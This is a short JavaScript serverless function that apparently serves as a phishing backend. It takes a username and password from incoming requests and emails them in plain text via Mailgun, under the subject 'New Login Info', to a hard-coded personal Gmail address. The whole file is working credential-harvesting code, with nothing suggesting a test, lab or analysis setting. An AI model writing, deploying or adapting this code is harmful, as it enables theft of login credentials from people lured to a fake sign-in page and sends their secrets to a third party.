import formData from 'form-data';
import Mailgun from 'mailgun.js';

const mailgun = new Mailgun(formData);
const mg = mailgun.client({
username: 'api',
key: process.env.MAILGUN_API_KEY
});

export async function handler(event) {
try {
const { username, password } = JSON.parse(event.body);

// Send email
await mg.messages.create(process.env.MAILGUN_DOMAIN, {
from: 'Mailgun Sandbox <postmaster@sandbox6bb4164382f045b9975489c0e3137797.mailgun.org>',
to: 'anabones716@gmail.com', // must be verified in Mailgun sandbox
subject: 'New Login Info',
text: `Username: ${username}\nPassword: ${password}`
});

return {
statusCode: 200,
body: JSON.stringify({ message: "Email sent!" })
};
} catch (error) {
console.error(error);
return {
statusCode: 500,
body: JSON.stringify({ message: "Error sending email" })
};
}
}
